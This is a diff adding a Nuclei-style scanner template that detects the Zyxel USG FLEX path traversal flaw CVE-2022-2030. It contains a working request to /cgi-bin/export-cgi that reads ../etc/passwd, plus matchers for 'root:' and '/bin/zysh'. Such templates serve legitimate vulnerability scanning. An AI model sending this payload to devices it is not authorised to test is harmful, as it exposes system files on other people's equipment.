@@ -1,0 +1,32 @@
+id: zyxel-path-traversal-cve-2022-2030
+info:
+  name: Zyxel Path Traversal Vulnerability (CVE-2022-2030)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Zyxel USG FLEX has a directory traversal vulnerability in certain CGI programs. This vulnerability, if exploited, allows unauthenticated attackers to access restricted files on the device.
+  reference:
+    - https://security.humanativaspa.it/useless-path-traversals-in-zyxel-admin-interface-cve-2022-2030/
+  classification:
+    cve-id: CVE-2022-2030
+    cvss-score: 7.5
+  tags: directory-traversal
+
+variables:
+  path: "../etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/export-cgi?category=dev_info&arg0={{path}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/bin/zysh"
+          - "root:"
